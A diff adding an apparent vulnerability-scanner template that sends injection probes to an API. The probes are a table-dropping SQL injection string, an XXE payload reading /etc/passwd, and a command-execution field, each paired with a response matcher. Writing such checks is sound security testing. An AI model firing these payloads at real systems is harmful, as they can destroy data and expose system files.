@@ -1,0 +1,93 @@
+id: injection-attacks-universal
+info:
+  name: Injection Attacks - Universal
+  author: APIShield
+  severity: high
+  description: Tests for various injection attack vulnerabilities
+  tags: api,injection,sql-injection,xss,xxe,command-injection
+  reference:
+    - https://owasp.org/www-project-api-security/
+    - https://owasp.org/www-community/attacks/SQL_Injection
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+    headers:
+      Content-Type: "application/json"
+      Accept: "application/json"
+    body: |
+      {
+        "query": "'; DROP TABLE users; --",
+        "search": "{{randstr}}"
+      }
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "sql"
+          - "mysql"
+          - "postgresql"
+          - "oracle"
+          - "syntax error"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 500
+          - 502
+          - 503
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+    headers:
+      Content-Type: "application/xml"
+      Accept: "application/xml"
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <data>&xxe;</data>
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "bin:"
+          - "daemon:"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "xxe"
+          - "xml external entity"
+        condition: and
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+    headers:
+      Content-Type: "application/json"
+      Accept: "application/json"
+    body: |
+      {
+        "command": "ls -la",
+        "input": "{{randstr}}"
+      }
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "total"
+          - "drwx"
+          - "rwx"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "command"
+          - "execution"
+        condition: and
+        part: body
